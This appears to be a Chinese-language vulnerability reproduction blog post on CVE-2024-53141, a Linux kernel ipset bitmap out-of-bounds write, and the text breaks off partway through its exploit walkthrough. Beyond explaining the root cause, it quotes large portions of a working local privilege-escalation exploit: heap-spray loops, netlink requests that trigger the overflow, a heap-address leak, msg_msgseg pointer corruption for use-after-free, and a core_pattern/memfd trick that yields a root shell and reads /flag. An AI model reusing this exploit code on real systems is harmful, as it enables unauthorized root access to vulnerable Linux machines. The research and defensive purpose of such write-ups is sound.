---
title: CVE-2024-53141
date: 2026-02-07 09:50:00
categories:
  - recurrence
tags:
---

# CVE-2024-53141

# 一.漏洞背景

​	该漏洞产生于ip_set的功能中由于在使用无类域间路由来更新ipset的bitmap集合的时候，并没有对于设置完掩码之后的更新ip地址与创建ip_set的初始地址进行比较，导致可以从一个异常的Ip地址开始进行插入，并且由于存在一个32位的int强制转化成16位，导致实现对于bitmap的异常访问，导致可以越界写一个堆地址，通过构造msg_msg以及sk_buff可以使得最终实现UAF漏洞。这个漏洞存在的范围很长从v2.7 - v6.12，但是实际上在复现的过程中发现，对于kernel版本是5之前的，不支持ip_set 7，并且强行cmp比对，因此对于后面的脚本需要修改到ip_set 6才可以打通。

### 1.1 ip_set介绍

​	这里借用[链接](https://u1f383.github.io/linux/2025/01/07/cve-2024-53141-an-oob-write-vulnerability-in-netfilter-ipset.html)的部分内容，主要是对于Ip_set创建以及更新的部分进行讲解

```C
#define ip_set(inst, id)        \
    ip_set_dereference(inst)[id]

static int ip_set_create(struct sk_buff *skb, const struct nfnl_info *info,
             const struct nlattr * const attr[])
{
    struct ip_set_net *inst = ip_set_pernet(info->net);
    struct ip_set *set, *clash = NULL;

    name = nla_data(attr[IPSET_ATTR_SETNAME]);
    typename = nla_data(attr[IPSET_ATTR_TYPENAME]);
    family = nla_get_u8(attr[IPSET_ATTR_FAMILY]);
    revision = nla_get_u8(attr[IPSET_ATTR_REVISION]);
    
    // [...]
    set = kzalloc(sizeof(*set), GFP_KERNEL); // [3]
    strscpy(set->name, name, IPSET_MAXNAMELEN);

    // [...]
    ret = find_set_type_get(typename, family, revision, &set->type); // [4]

    ret = set->type->create(info->net, set, tb, flags); // [5]

    ret = find_free_id(inst, set->name, &index, &clash); // [6]

    // [...]
    ip_set(inst, index) = set; // [7]
    return ret;
}
```

​	在 Linux 内核的 Netfilter 子系统 IP 集合（ip_set）框架中，ip_set_create 函数负责根据用户态传入的配置参数动态创建新的集合实例。以 bitmap:ip 类型为例，其核心流程始于从 Netlink 消息中提取关键参数：用户指定的集合名称（name）、类型标识符（typename，如 "bitmap:ip"）、地址族（family，通常为 AF_INET）及版本号（revision）。内核首先通过 kzalloc 分配 ip_set 结构体内存并初始化基础属性，随后调用 find_set_type_get 在全局注册的类型列表中匹配与 typename 和 revision 对应的集合类型操作集（struct ip_set_type），这一过程隐式验证了类型合法性。完成类型绑定后，内核触发类型专属的 create 回调函数（如 bitmap_ip_create），由该函数解析类型相关的扩展参数（如 IP 范围、位图尺寸）并初始化类型私有数据结构。最后，通过 find_free_id 在全局实例表中分配唯一索引，将新创建的集合插入 ip_set_net 的二维指针数组完成注册，漏洞点发生在bitmap的创建和插入过程中。

```C
static int ip_set_uadd(struct sk_buff *skb, const struct nfnl_info *info,
               const struct nlattr * const attr[])
{
    return ip_set_ad(info->net, info->sk, skb,
             IPSET_ADD, info->nlh, attr, info->extack);
}
static int ip_set_ad(struct net *net, struct sock *ctnl,
             struct sk_buff *skb,
             enum ipset_adt adt,
             const struct nlmsghdr *nlh,
             const struct nlattr * const attr[],
             struct netlink_ext_ack *extack)
{
    struct ip_set *set;

    set = find_set(inst, nla_data(attr[IPSET_ATTR_SETNAME])); // [8]
    // [...]
    nla_parse_nested(tb, IPSET_ATTR_ADT_MAX,
                     attr[IPSET_ATTR_DATA],
                     set->type->adt_policy, NULL);
    ret = call_ad(net, ctnl, skb, set, tb, adt, flags, // [9]
                  use_lineno);
    // [...]
}

static int
call_ad(struct net *net, struct sock *ctnl, struct sk_buff *skb,
    struct ip_set *set, struct nlattr *tb[], enum ipset_adt adt,
    u32 flags, bool use_lineno)
{
    // [...]
    do {
        ip_set_lock(set);
        ret = set->variant->uadt(set, tb, adt, &lineno, flags, retried); // [10]
        ip_set_unlock(set);
        retried = true;
    } while (/*...*/);
    // [...]
}
```

​	在 Netfilter IP 集合的成员操作流程中，ip_set_uadd 作为用户态添加元素请求的入口函数，通过 ip_set_ad 间接完成核心操作。该函数首先根据集合名称从全局实例表（ip_set_net）中查找目标集合对象（find_set），随后解析嵌套的 Netlink 属性（nla_parse_nested）以提取待操作数据（如 IP 地址、端口范围等）。最终通过 call_ad 触发类型特定的操作函数（set->variant->uadt），在持有集合锁（ip_set_lock）的同步上下文中执行原子化的位图更新、哈希表插入等底层操作。

```C
static int
bitmap_ip_create(struct net *net, struct ip_set *set, struct nlattr *tb[],
         u32 flags)
{
    ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &first_ip);
    // [...]
    if (tb[IPSET_ATTR_IP_TO]) {
        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &last_ip);
        // [...]
    }

    if (tb[IPSET_ATTR_NETMASK]) {
        netmask = nla_get_u8(tb[IPSET_ATTR_NETMASK]);
        // [...]
    }

    mask = range_to_mask(first_ip, last_ip, &mask_bits);
    elements = 2UL << (netmask - mask_bits - 1); // [1]

    // [...]
    map = ip_set_alloc(sizeof(*map) + elements * set->dsize); // [2]
    map->memsize = BITS_TO_LONGS(elements) * sizeof(unsigned long);
    set->variant = &bitmap_ip;
    init_map_ip(set, map, first_ip, last_ip, elements, hosts, netmask);

    // [...]
}

static bool
init_map_ip(struct ip_set *set, struct bitmap_ip *map,
        u32 first_ip, u32 last_ip,
        u32 elements, u32 hosts, u8 netmask)
{
    // [...]
    map->set = set;
    set->data = map; // [3]
    // [...]
}
```

​	在 bitmap:ip 类型集合的创建过程中，bitmap_ip_create 函数通过解析用户传入的起始 IP（IPSET_ATTR_IP）、终止 IP（IPSET_ATTR_IP_TO）及子网掩码（IPSET_ATTR_NETMASK）参数，动态计算 IP 地址范围并推导出位图存储的容量需求。关键操作中，内核首先将 IP 范围与掩码结合，通过 range_to_mask 计算实际覆盖的地址段，再以 elements = 2UL << (netmask - mask_bits - 1) 公式确定位图的理论容量。随后通过 ip_set_alloc 分配复合内存结构：除基础 bitmap_ip 结构体外，额外为每个元素预留 set->dsize 长度的扩展空间，这种弹性设计允许后续功能模块（如 comment 扩展）动态挂载附加数据区（如注释字符串指针）。最终，init_map_ip 将分配的内存与 ip_set 主结构绑定，通过 set->data = map 实现双向关联，同时初始化位图的存储参数（如内存布局、IP 边界），为后续的增删查操作奠定数据基础。

```C
#define ip_set_mask_from_to(from, to, cidr)    \
do {                                           \
    from &= ip_set_hostmask(cidr);             \
    to = from | ~ip_set_hostmask(cidr);        \
} while (0)

static int
bitmap_ip_uadt(struct ip_set *set, struct nlattr *tb[],
           enum ipset_adt adt, u32 *lineno, u32 flags, bool retried)
{
    ipset_adtfn adtfn = set->variant->adt[adt];
    // [...]
    ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &ip);
    // [...]
    if (ip < map->first_ip || ip > map->last_ip) // [4]
        return -IPSET_ERR_BITMAP_RANGE;

    if (tb[IPSET_ATTR_IP_TO]) {
        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &ip_to);
        if (ip > ip_to) {
            swap(ip, ip_to);
            if (ip < map->first_ip) // [5]
                return -IPSET_ERR_BITMAP_RANGE;
        }
    } else if (tb[IPSET_ATTR_CIDR]) {
        u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);
        // [...]
        ip_set_mask_from_to(ip, ip_to, cidr); // [6]
    } /* ... */

    if (ip_to > map->last_ip) // [7]
        return -IPSET_ERR_BITMAP_RANGE;

    for (; !before(ip_to, ip); ip += map->hosts) {
        e.id = ip_to_id(map, ip);
        ret = adtfn(set, &e, &ext, &ext, flags); // [8]
        // [...]
    }
}
```

```C
struct bitmap_ip_adt_elem {
	u16 id;
};	
static u32
ip_to_id(const struct bitmap_ip *m, u32 ip)
{
	return ((ip & ip_set_hostmask(m->netmask)) - m->first_ip) / m->hosts;
}
```

​	在 bitmap:ip 类型的元素添加逻辑中，bitmap_ip_uadt 函数通过解析用户传入的 IP、IP_TO 或 CIDR 参数，动态生成目标 IP 地址段并进行边界校验。当用户指定 CIDR 格式时，内核通过 ip_set_mask_from_to 宏将 CIDR 掩码转换为连续 IP 范围，该宏以网络序对起始 IP（ip）进行掩码截断，生成规范化的起止地址（如 192.168.1.0/24 将生成 ip=192.168.1.0，ip_to=192.168.1.255）。然而，在后续校验流程中，代码仅通过 ip_to > map->last_ip 检查终止地址是否超出集合预定义的全局边界（map->last_ip），却未对规范化后的起始地址 ip 执行下限校验（如 ip < map->first_ip）。这种单向校验的缺陷使得攻击者可通过构造特定的 CIDR 参数，使 ip_set_mask_from_to 计算出的 ip 远小于 map->first_ip，而 ip_to 恰好落在合法范围内。此时，ip_to_id 函数将基于越界的 ip 计算出负值的逻辑 ID，但由于返回值类型（u32）与结构体成员类型（u16）不匹配，构造好的整数转换会变成越界的正整数，从而实现越界写。

```C
static int
mtype_add(struct ip_set *set, void *value, const struct ip_set_ext *ext,
      struct ip_set_ext *mext, u32 flags)
{
    // [...]
    set_bit(e->id, map->members); // [9]
    set->elements++;
}
```

​	在 mtype_add 函数中，内核通过 set_bit(e->id, map->members) 将目标 IP 地址经 ip_to_id 转换后的数值型 ID 映射到位图（map->members）的对应比特位，通过置位操作标记该 IP 的存在性，此过程若因 e->id 超出 map->members 预分配范围（如 CIDR 漏洞导致 ID 计算为超大值），将引发位图内存的越界写操作，直接篡改相邻内核数据结构，构成提权攻击的原子操作点。

```C
#define ext_comment(e, s)	\
((struct ip_set_comment *)(((void *)(e)) + (s)->offset[IPSET_EXT_ID_COMMENT]))
struct ip_set_comment {
	struct ip_set_comment_rcu __rcu *c;
};
void
ip_set_init_comment(struct ip_set *set, struct ip_set_comment *comment,
		    const struct ip_set_ext *ext)
{
	struct ip_set_comment_rcu *c = rcu_dereference_protected(comment->c, 1);
	size_t len = ext->comment ? strlen(ext->comment) : 0;

	if (unlikely(c)) {
		set->ext_size -= sizeof(*c) + strlen(c->str) + 1;
		kfree_rcu(c, rcu);
		rcu_assign_pointer(comment->c, NULL);
	}
	if (!len)
		return;
	if (unlikely(len > IPSET_MAX_COMMENT_SIZE))
		len = IPSET_MAX_COMMENT_SIZE;
	c = kmalloc(sizeof(*c) + len + 1, GFP_ATOMIC);
	if (unlikely(!c))
		return;
	strscpy(c->str, ext->comment, len + 1);
	set->ext_size += sizeof(*c) + strlen(c->str) + 1;
	rcu_assign_pointer(comment->c, c);
}
EXPORT_SYMBOL_GPL(ip_set_init_comment);
```

​	在 IP 集合的 comment 扩展机制中，当用户为集合元素附加描述信息时，内核通过 ip_set_init_comment 函数动态管理注释内存：若该元素已存在注释（comment->c 非空），则通过 RCU 机制异步释放旧内存（kfree_rcu）并递减集合扩展数据尺寸（ext_size）；随后根据用户输入的注释字符串长度（上限为 IPSET_MAX_COMMENT_SIZE），以 GFP_ATOMIC 标志在原子上下文中分配 ip_set_comment_rcu 结构体内存（16 字节头部 + 字符串空间），使用安全拷贝函数 strscpy 将用户态数据写入内核缓冲区，最后通过 rcu_assign_pointer 原子更新注释指针并扩展 ext_size。

```C
static inline void
ip_set_init_counter(struct ip_set_counter *counter,
		    const struct ip_set_ext *ext)
{
	if (ext->bytes != ULLONG_MAX)
		atomic64_set(&(counter)->bytes, (long long)(ext->bytes));
	if (ext->packets != ULLONG_MAX)
		atomic64_set(&(counter)->packets, (long long)(ext->packets));
}
```

​	在 IP 集合的 counter 扩展机制中，内核通过原子操作实现对网络流量的精细化统计。当用户态指定 bytes 和 packets 初始值时（默认值为 ULLONG_MAX 表示不初始化），ip_set_init_counter 函数会以原子方式将用户提供的 64 位无符号整数值通过类型转换（long long）写入 atomic64_t 类型的计数器结构体成员。这种设计通过 atomic64_set 确保多核环境下流量统计的原子性更新，同时允许动态配置初始统计基数（如重置计数器场景）。这里的两个指针bytes和packets可以通过用户态传入，这样就可以控制指定位置写两个指针。

# 二.漏洞成因

​	对于漏洞具体利用，可以利用下述方式可以实现最终的攻击效果。

### 2.1 泄露出内核堆地址

```C
  static int
  bitmap_ip_create(struct net *net, struct ip_set *set, struct nlattr *tb[],
          u32 flags)
  {
      struct bitmap_ip *map;
      // [...]
      set->dsize = ip_set_elem_len(set, tb, 0, 0); // 0x8, comment length
      map = ip_set_alloc(sizeof(*map) + elements * set->dsize); // 0x58 + 0x8 * 53 == 512, kmalloc-cg-512
      // [...]
  }
  static bool
  init_map_ip(struct ip_set *set, struct bitmap_ip *map,
          u32 first_ip, u32 last_ip,
          u32 elements, u32 hosts, u8 netmask)
  {
      map->members = bitmap_zalloc(elements, GFP_KERNEL | __GFP_NOWARN); // 8, kmalloc-8
      // [...]
  }
```

​	首先就是可以重新看一下bitmap_ip_create的代码，再最开始创建bitmap的时候之前也说过，会根据不同的扩展类型定义不同的set->dsize，这里对于comment模式来说set->dsize为8，这样分配出来的map也就是计算出来恰好是512个字节的长度，可以分配kmalloc-cg-512的object。通过上述的gdb调试信息我们也可以清晰的看到对应bitmap的详细结构，其中我们需要关注的就是members也就是bitmap的内容，以及最终扩展的指针。

![1742260034819](images/CVE-2024-53141/1742260034819.jpg)

![1742260081534](images/CVE-2024-53141/1742260081534.jpg)

```C
  static u32
  ip_to_id(const struct bitmap_ip *m, u32 ip)
  {
      return ((ip /* 0xe0000000 */ & ip_set_hostmask(m->netmask) /* 0xffffffff */) - m->first_ip /* 0xffffffcb */) / m->hosts /* 1 */;
  }
```

​	之后便是对于如何通过设置 0xffffffcb (first_ip)， 0xffffffff (last_ip)实现出现越界的写，这里当我们利用CIDR为3进行配置的时候，我们ip就被更新为0xe0000000，通过上述ip_to_id的计算，就可以获得到id的值为0xe0000035，但是之前原理用也有分析，bitmap_ip_adt_elem结构体的id实际上是一个u16的类型，经过阶段之后就是0x35，相当于ip对应的id被认为是0x35，其实这里id就已经指向的是下一个object了。因为之前分配的内存是0x35个dsize，第0x35指针指向的就是下一个object

![1742261583103](images/CVE-2024-53141/1742261583103.jpg)

![1742261699346](images/CVE-2024-53141/1742261699346.jpg)

​	这里截图实际上是对于bitmap的内存进行介绍，这里0xffe实际上就是因为0x35指向的是第53个bit，之后会循环的设置bitmap，并且对于对应id的内存写一个kmalloc-cg-192的comment指针。

![1742261755154](images/CVE-2024-53141/1742261755154.jpg)

​	这里借用一下之前提供链接的图片，可以更加可视化的看出之前讲述的内容，通过覆盖comment指针到下一个object，并且再bitmap前后利用skb_buff进行堆喷，可以将这个指针写道skb_buff的区域，最终可以读取这里的指针地址。

### 2.2 防止越界写导致程序崩溃

​	经过上述的攻击，我们就可以获取到一个指向kmalloc-cg-192的指针，但是如果没有设置结束条件的话，会出现一直写指针地址，直到把所有ip都写完（0xe0000000这些无类域间路由全部添加），因此我们再bitmap的起始位置加入ip，使其标注为1，刚才仔细关注gdb调试截图的时候就可以发现这个现象，这样当我们更新到下一个Bitmap的时候就会发现这里已经添加了，就会直接返回停止更新。

```C
static int
bitmap_ip_do_add(const struct bitmap_ip_adt_elem *e, struct bitmap_ip *map,
         u32 flags, size_t dsize)
{
    return !!test_bit(e->id, map->members); // [2]
}

static int
mtype_add(struct ip_set *set, void *value, const struct ip_set_ext *ext,
      struct ip_set_ext *mext, u32 flags)
{
    struct mtype *map = set->data;
    const struct mtype_adt_elem *e = value;
    int ret = mtype_do_add(e, map, flags, set->dsize);

    if (ret == IPSET_ADD_FAILED /* 1 */) {
        // [...]
        else if (!(flags & IPSET_FLAG_EXIST)) {
            set_bit(e->id, map->members);
            return -IPSET_ERR_EXIST; // [3]
        }
    }
    // [...]
}
```

![1742262046593](images/CVE-2024-53141/1742262046593.jpg)

### 2.3 UAF漏洞利用

​	到了这一步实际上就是攻击利用的关键点，如何利用现有已知的堆地址实现UAF，这里我们可以想到msg_msg结构体，这里我也说一下为什么这样构造（下面的图都是借鉴别人的），对于第一步堆喷skb_buff之后泄露堆地址主要是因为skb_buff的结构体信息**skb_shared_info**实际上存储到object的最后部分，因此我们再object的头部写堆地址并不会导致程序崩溃，而这里再UAF的时候利用msg_msg是因为**msg_msgseg**的next指针是存储到结构体的头部，因此我们只要覆盖一个指针的内容就可以控制msg_msg链，最终删除的时候可以将指定的堆地址一同free。

![1742266065592](images/CVE-2024-53141/1742266065592.jpg)

![1742265989434](images/CVE-2024-53141/1742265989434.jpg)

```c
  static inline void
  ip_set_init_counter(struct ip_set_counter *counter,
              const struct ip_set_ext *ext)
  {
      if (ext->bytes != ULLONG_MAX)
          atomic64_set(&(counter)->bytes, (long long)(ext->bytes));
      if (ext->packets != ULLONG_MAX)
          atomic64_set(&(counter)->packets, (long long)(ext->packets));
  }
 static int
  bitmap_ip_create(struct net *net, struct ip_set *set, struct nlattr *tb[],
          u32 flags)
  {
      struct bitmap_ip *map;
      // [...]
      set->dsize = ip_set_elem_len(set, tb, 0, 0); // 0x10, counter length
      map = ip_set_alloc(sizeof(*map) + elements * set->dsize); // 0x58 + 0x10 * 64 == 1112, kmalloc-cg-2k
      // [...]
  }
```

​	对于越界写实际上利用的就是Counter类型，这里之前再介绍部分也有讲述，实际上这里set->dsize的值是0x10，也就是存储用户态传递过来的两个指针，这里创建的map大小是1112，也是分配kmalloc-cg-2k的object，之后再这个Object前后进行堆喷，这样通过越界写指针就可以覆盖msg_msgseg的Next指针，这样就可以再free的时候一同free指向的object。这里需要注意next指向的内存区域实际上是kmalloc-cg-1k的object，和最开始的skb_buff不是一个，为了增加对于猜测成功率，我们可以再最开始进行堆喷kmalloc-cg-1k的object。

![1742266615726](images/CVE-2024-53141/1742266615726.jpg)

![1742266623700](images/CVE-2024-53141/1742266623700.jpg)

​	上图实际上就是对于漏洞利用前后的状态，最终就可以实现UAF漏洞，对于skb_buff删除，后面的利用原理就十分简单了，我们只需要继续堆喷pipe_buffer，之后分配到UAF的skb_buff，并且覆盖函数指针，最终就可以实现rop链。

# 三.exp利用原理分析

​	首先对于官方提供的exp来说，是通过利用上述的越界写，通过skb_buff获取堆指针的值，之后利用覆盖msg_seg的next指针，使其指向目标的skb_buff的object，通过释放msg_msg结构体就可以将skb_buff释放形成uaf，最终利用堆喷pipe_buffer，使得可以利用篡改函数指针最终实现rop链子执行，接下来我们就通过exp的流程对于漏洞具体利用进行阐述

```C
int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		usleep(100);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}


setvbuf(stdout, 0, 2, 0);
	if (argc > 1)
	{
		// #define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;echo o>/proc/sysrq-trigger");
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(0);
		setsid();
		crash("");
	}
	set_cpu(1);
```

​	exp首先利用通过 fork 创建子进程执行 crash 函数，子进程利用 memfd_create 创建匿名内存文件并将当前进程镜像（/proc/self/exe）完整拷贝至该文件描述符（memfd），随后通过 dup2 将其绑定到保留的 fd 666，并循环检查 /proc/sys/kernel/core_pattern 是否被内核 ROP 链篡改为管道命令 |/proc/%P/fd/666（%P 会在崩溃时替换为进程 PID），一旦检测到篡改成功，立即通过解引用空指针 *(size_t *)0 = 0 触发段错误，迫使内核执行核心转储处理逻辑——以 root 权限 启动 fd 666 指向的恶意程序（即攻击者预载的提权代码镜像），最终父进程通过 pidfd_getfd 窃取目标进程的标准输入输出流，执行 cat /flag 提取敏感数据并触发系统关机（sysrq-trigger），完成从内存文件隐蔽加载、内核漏洞触发到权限升级的完整攻击链。

```C

	// prepare a lot unix_socket for spray skbs
	for (int i = 0; i < 0x400; i++)
	{
		size_t val = 0x400000;
		SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, spray_fd2[i]));
		SYSCHK(SYSCHK(setsockopt(spray_fd2[i][0], SOL_SOCKET, SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(spray_fd2[i][1], SOL_SOCKET, SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(spray_fd2[i][0], SOL_SOCKET, SO_RCVBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(spray_fd2[i][1], SOL_SOCKET, SO_RCVBUF, &val, 4)));
	}

	// spray a lot skbs ahead for later guess skb chunk addr success rate higher
	for (int i = 0; i < 0x400; i++)
	{
		for (int j = 0; j < 0x100; j++)
		{
			write(spray_fd2[i][0], buf, 0x200);
			write(spray_fd2[i][1], buf, 0x200);
		}
	}
```

​	该代码通过批量创建 UNIX 域套接字对（AF_UNIX）并操纵其缓冲区参数，实现针对 Linux 内核内存管理机制的系统性预布局。具体原理为：首先通过 socketpair 创建 0x400 对（1024 对）本地流式套接字，每对套接字的两端均通过 setsockopt 将其发送缓冲区（SO_SNDBUF）和接收缓冲区（SO_RCVBUF）设置为 0x400000（4MB），该操作会触发内核调整套接字底层结构体 sock 的 sk_sndbuf 和 sk_rcvbuf 字段值将其设置为0x68000；随后通过嵌套循环向每对套接字的两端持续写入 0x200 字节数据（每次 write 调用），此过程会触发内核协议栈调用 alloc_skb_with_frags 从 skbuff_head_cache 分配 sk_buff 结构体，并通过 kmalloc_reserve 在 kmalloc-cg-1k 缓存池中分配 1k的内存区域进行堆喷，方便后面再给msg_seg结构体的next覆盖成指定堆指针时，该指针指向kmalloc-cg-1k的object的概率更高。

```C
// create new unprivileged network IPC namespace to reach vulnerability
	SYSCHK(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWIPC));

	// create a lot msgqueue for later to spray msg_msg and msg_msgseg 
	for (int i = 0; i < 0x4000; i++)
	{
		msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		SYSCHK(msqid[i]);
	}

	// prepare another set of unix_sockets for spray skbs
	for (int i = 0; i < 0x100; i++)
	{
		SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, spray_fd[i]));
	}

	// make comment_string be allocated under kmalloc-192
	memset(comment_string, 'a', 0x90);

	msg.mtype = 1;
	int fail = 1;

	int sock_fd = netlink_open(NETLINK_NETFILTER);
	if (sock_fd < 0)
	{
		fprintf(stderr, "Failed to open Netlink socket\n");
		return EXIT_FAILURE;
	}

	for (int i = 0; i < 0x1000; i++)
	{
		sprintf(name, "%d", i);
		if (i == 0x800)
		{
			// if reach target loop, we spray a lot kmalloc-cg-512 skbs ahead
			for (int i = 0; i < 0x100; i++)
				SYSCHK(write(spray_fd[i][0], buf, 0x80));
		}
		// allocate target ipset
		create_ip_set_kmalloc_1024(sock_fd, name, "bitmap:ip", AF_INET,i==0x800);

		// set bit to each ipset in order to make oob write stop
		add_ip_to_set(sock_fd, name, "A", AF_INET,htonl(-0x35));
		if (i == 0x800)
		{
			// if reach target loop, we spray a lot kmalloc-cg-512 skbs after allocating target ipset
			for (int i = 0; i < 0x100; i++)
				SYSCHK(write(spray_fd[i][1], buf, 0x80));
		}

	}

	// trigger oob write to keep allocate comment_string to overwrite next chunk(skb) contents as kernel heap
	trigger_oob_leak(sock_fd, "2048", "A", AF_INET);
```

​	这里便是触发漏洞的关键代码，首先做一下准备条件，先对于后面堆喷msg_msg结构体以及skb_buff进行准备，之后便是通过创建ip_set来触发漏洞。我们重点关注循环的设计，首先是一直循环创建ipset，每一个ipset都以循环的名字命名，之后当到达2048的时候，进行特殊的处理，首先进行skb_buff堆喷，之后分配ip_set，并且这里有一个flag标志，之后创建完ip_set之后继续进行堆喷。到这里很好理解，实际上就是通过堆喷kmalloc-cg-512，使得之前说的存在越界写的位置可以再skb_buff的object里面写一个堆地址，也就是comment指针（下面会详细阐述如何实现这个漏洞的），这样我们就可以获取一个kmalloc-cg-192的地址，方便后面对于kmalloc-cg-1k的Object地址进行猜测。

```C
int create_ip_set_kmalloc_1024(int sock_fd, const char *set_name, const char *type_name, uint8_t family, int extra)
{
	char buf[1024];
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);

	nlh->nlmsg_type = IPSET_CMD_CREATE | (6 << 8);
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;

	mnl_nlmsg_put_extra_header(nlh, 4);

	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);
	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);
	mnl_attr_put_strz(nlh, IPSET_ATTR_TYPENAME, type_name);
	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);
	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, 0);

	struct nlattr *attr_data = mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);

	struct nlattr *attr_ip = mnl_attr_nest_start(nlh, IPSET_ATTR_IP);

	// 0x35*8+0x58 is under kmalloc-cg-512
	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(-0x35));

	mnl_attr_nest_end(nlh, attr_ip);

	attr_ip = mnl_attr_nest_start(nlh, IPSET_ATTR_IP_TO);
	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(-1));
	mnl_attr_nest_end(nlh, attr_ip);

	if (extra)
		mnl_attr_put_u32(nlh, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, htonl(IPSET_FLAG_WITH_COMMENT));

	// map size depend on map = ip_set_alloc(sizeof(*map) + elements * set->dsize);
	// IPSET_FLAG_WITH_COMMENT cause set->dsize == 0x8
	// 0x35*0x8 + sizeof(*map) is under kmalloc-cg-512

	mnl_attr_nest_end(nlh, attr_data);

	return netlink_send(sock_fd, nlh);
}
```

​	这里就是如何创建ip_set，首先关注一下create_ip_set_kmalloc_1024函数，其实原理很简单，最开始这些步骤就是简单设置一些需要利用ipset通信的配置信息mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);这里就是我之前说的设置协议的版本，如果5开头的kernel之前的版本时不支持ipset6的。之后便是设置first_ip和last_ip，并且对于flag也有详细的要求，只有到达了2048这个object才会单独设置允许添加Comment的ip_set。

```C
int trigger_oob_leak(int sock_fd, const char *set_name, const char *cidr, uint8_t family)
{

	char buf[1024];
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);

	nlh->nlmsg_type = IPSET_CMD_ADD | (6 << 8);
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL;

	mnl_nlmsg_put_extra_header(nlh, 4);

	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);
	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);

	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);
	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, 0);

	struct nlattr *attr_data = mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);

	struct nlattr *attr_ip = mnl_attr_nest_start(nlh, IPSET_ATTR_IP);

	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(-1));

	mnl_attr_nest_end(nlh, attr_ip);

	// IPSET_ATTR_CIDR==3 make `ip` is 0xe0000000 and `ip_to` 0xffffffff
	mnl_attr_put_u8(nlh, IPSET_ATTR_CIDR, 3);

	mnl_attr_put_strz(nlh, IPSET_ATTR_COMMENT, comment_string);

	mnl_attr_nest_end(nlh, attr_data);

	return netlink_send(sock_fd, nlh);
}
```

​	之后对于触发oob读就是利用之前讲述的原理，通过设置IPSET_ATTR_CIDR，可以触发漏洞，并且再下一个object的空间中写入堆地址。

```C
	for (int i = 0; i < 0x100; i++)
	{
		recv(spray_fd[i][0], buf, 0x80, MSG_PEEK);
		if (buf[0])
			pipe_buf_addr = *(size_t *)(&buf[0]);
		recv(spray_fd[i][1], buf, 0x80, MSG_PEEK);
		if (buf[0])
			pipe_buf_addr = *(size_t *)(&buf[0]);
	}
	printf("leak heap addr 0x%lx\n", pipe_buf_addr);
	if (pipe_buf_addr == 0)
	{
		exit(0);
	}

	// We choose a guess addr, hope its under kmalloc-cg-1024
	// Later we will reclaim it as pipe_buf
	pipe_buf_addr &= ~(0x10000000 - 1);
	printf("Our guess kernel heap addr 0x%lx\n", pipe_buf_addr);
```

​	这里便是对于内核kmalloc-cg-192的地址进行猜测，希望可以猜测的地址可以指向kmalloc-cg-1k的object，至此，完成了对于泄露堆地址的全部内容

```C
	for (int i = 0; i < 0x1000; i++)
	{
		sprintf(name, "x%d", i);
		if (i == 0x800)
		{
			// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg ahead
			for (int i = 0; i < 0x1000; i++)
				SYSCHK(msgsnd(msqid[i], &msg, 0x1000 - 0x30 + 0x800 - 0x8, 0));
		}
		// allocate target ipset
		create_ip_set_kmalloc_2048(sock_fd, name, "bitmap:ip", AF_INET,i == 0x800);
		// set bit to each ipset in order to make oob write stop
		add_ip_to_set(sock_fd, name, "A", AF_INET,htonl(-0x40 + 0x3b));
		if (i == 0x800)
		{
